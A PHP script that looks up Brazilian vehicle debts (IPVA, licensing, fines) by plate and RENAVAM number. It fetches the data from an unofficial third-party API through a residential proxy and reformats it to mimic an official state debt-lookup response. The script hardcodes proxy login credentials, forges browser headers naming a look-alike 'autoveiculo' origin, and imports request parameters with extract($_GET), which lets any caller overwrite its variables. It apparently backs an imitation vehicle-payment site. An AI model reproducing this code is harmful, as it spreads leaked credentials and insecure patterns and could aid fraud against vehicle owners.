<?php

error_reporting(0);

extract($_GET);

if($placa && $renavam){

   function GetStr($str, $start, $end) {
      $a = explode($end, explode($start, $str)[1] )[0];
      return $a;
   } 

   $proxy =  'c31c3577c56b2059.shg.na.pyproxy.io:16666';
   $proxyuserpwd = 'josepdrjw25-zone-resi-region-br:A1b2C3d4';

   $ch = curl_init();
   curl_setopt($ch, CURLOPT_URL, "https://firestoneteam.xyz/firestone/api.php?nome=mrks&tela=go&lista=$placa|$renavam");
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

   curl_setopt($ch, CURLOPT_HTTPHEADER, [
      'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
      'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
      'cache-control: no-cache',
      'content-type: application/x-www-form-urlencoded',
      'dnt: 1',
      'origin: https://autoveiculo.sa.com',
      'pragma: no-cache',
      'priority: u=0, i',
      'referer: https://autoveiculo.sa.com/',
      'sec-ch-ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
      'sec-ch-ua-mobile: ?0',
      'sec-ch-ua-platform: "Windows"',
      'sec-fetch-dest: document',
      'sec-fetch-mode: navigate',
      'sec-fetch-site: same-origin',
      'sec-fetch-user: ?1',
      'upgrade-insecure-requests: 1',
      'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
   ]);

   $response = curl_exec($ch);

   if($response){

      if (strpos($response, 'debts') !== false) {

        $data = json_decode($response, true);

        // -------------------------------------------
        // Função para limpar e converter valores em float
        // -------------------------------------------
         function parseValor($valor) {
            // Remove o "R$" e espaços
            $valor = trim(str_replace('R$', '', $valor));
            if (preg_match('/\.\d{3},/', $valor)) {
                $valor = str_replace('.', '', $valor);
            }
            $valor = str_replace(',', '.', $valor);
            return (float) $valor;
        }

        // -------------------------------------------
        // Agrupando valores automaticamente
        // -------------------------------------------
        $totalIpva = 0.0;
        $totalLicenciamento = 0.0;
        $totalMultas = 0.0;

        foreach ($data['debts'] as $d) {
            $valor = parseValor($d['valor']);
            $desc = strtoupper($d['descricao']);

            if (strpos($desc, 'IPVA') !== false) {
                $totalIpva += $valor;
            } elseif (strpos($desc, 'LICENCIAMENTO') !== false) {
                $totalLicenciamento += $valor;
            } elseif (strpos($desc, 'MULTA') !== false || strpos($desc, 'TRANSITAR') !== false || strpos($desc, 'AVANC') !== false) {
                $totalMultas += $valor;
            }
        }

        // Soma total de débitos
        $totalDebitos = $totalIpva + $totalLicenciamento + $totalMultas;

        // -------------------------------------------
        // Monta estrutura final automaticamente
        // -------------------------------------------
        $novoFormato = [
            "status" => "ok",
            "acao" => [
                "debitosTotaisVeiculo" => [
                    "descricao" => null,
                    "totalSeguro" => $data["debitosTotaisVeiculo"]["totalSeguro"] ?? "R$ 0,00",
                    "totalMultas" => "R$ " . number_format($totalMultas, 2, ',', '.'),
                    "totalIpva" => "R$ " . number_format($totalIpva, 2, ',', '.'),
                    "totalDebitos" => "R$ " . number_format($totalDebitos, 2, ',', '.'),
                    "totalLicenciamento" => "R$ " . number_format($totalLicenciamento, 2, ',', '.'),
                ],
                "situacaoMultaVeiculo" => [
                    "multasVencidas" => [],
                    "multasNaoVencidas" => [],
                    "multasSubJudice" => [],
                    "multasParceladas" => [],
                    "multasNotificadas" => [],
                    "multasAtivaSne" => [],
                    "multasNaoNotificadas" => []
                ],
                "debitosVeiculo" => [],
                "debitosServicosVeiculo" => null,
                "debitosTotaisServicosVeiculo" => null
            ]
        ];

        // -------------------------------------------
        // Preenche lista de débitos por ano (dinâmico)
        // -------------------------------------------
        $anos = [];
        foreach ($data['debts'] as $debito) {
            preg_match('/\d{4}$/', $debito['vencimento'], $anoEncontrado);
            $ano = $anoEncontrado[0] ?? null;
            if ($ano) {
                $anos[$ano][] = $debito;
            }
        }

        foreach ($anos as $ano => $lista) {
            $valorIpva = 0;
            $valorLicenciamento = 0;
            $valorMulta = 0;
            foreach ($lista as $d) {
                $valor = parseValor($d['valor']);
                $desc = strtoupper($d['descricao']);
                if (strpos($desc, 'IPVA') !== false) $valorIpva += $valor;
                if (strpos($desc, 'LICENCIAMENTO') !== false) $valorLicenciamento += $valor;
                if (strpos($desc, 'MULTA') !== false || strpos($desc, 'TRANSITAR') !== false) $valorMulta += $valor;
            }

            $totalAno = $valorIpva + $valorLicenciamento + $valorMulta;
            $novoFormato["acao"]["debitosVeiculo"][] = [
                "valorTotal" => $totalAno > 0 ? "R$ " . number_format($totalAno, 2, ',', '.') : "----",
                "valorIpva" => $valorIpva > 0 ? "R$ " . number_format($valorIpva, 2, ',', '.') : "PAGO",
                "dataVencimento" => end($lista)['vencimento'],
                "valorLicenciamento" => $valorLicenciamento > 0 ? "R$ " . number_format($valorLicenciamento, 2, ',', '.') : "PAGO",
                "valorSeguro" => "NAO SE APLICA",
                "valorMulta" => $valorMulta > 0 ? "R$ " . number_format($valorMulta, 2, ',', '.') : "----",
                "anoExercicio" => $ano,
                "permiteEmissao" => $ano == date('Y') + 1 ? "S" : "N",
                "permiteEmissaoIpvaAutuado" => "N",
                "valorMultaAcumulado" => "R$ 0,00"
            ];
        }

        if(!$novoFormato["acao"]["debitosVeiculo"]){
            $novoFormato["acao"]["debitosVeiculo"][] = [
                "valorTotal" =>  "----",
                "valorIpva" =>  "----",
                "dataVencimento" => "----",
                "valorLicenciamento" =>  "PAGO",
                "valorSeguro" => "NAO SE APLICA",
                "valorMulta" =>  "R$ 0,00",
                "anoExercicio" => "2025",
                "permiteEmissao" =>  "S",
                "permiteEmissaoIpvaAutuado" => "N",
                "valorMultaAcumulado" => "R$ 0,00"
            ];
        }

        echo json_encode($novoFormato, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);

      }else {
           echo $response;
        // echo "erro nos dados debitosServer!";
      }

   }else {
      echo "erro no retorno!";
   }

}else{
   echo "paramentro invalido!";
}

  